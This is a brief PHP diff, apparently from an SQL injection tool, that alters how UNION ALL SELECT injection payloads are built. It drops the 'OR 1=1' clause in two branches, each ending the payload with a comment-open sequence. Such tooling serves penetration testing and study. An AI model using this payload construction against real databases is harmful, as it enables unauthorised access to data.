@@ -745,11 +745,11 @@
 
 				if($useEndingPayload){
 
-					$value		= "$value OR 1=1 UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
+					$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
 
 				}else{
 
-					$value		= "$value OR 1=1 UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
+					$value		= "$value UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
 
 				}
 
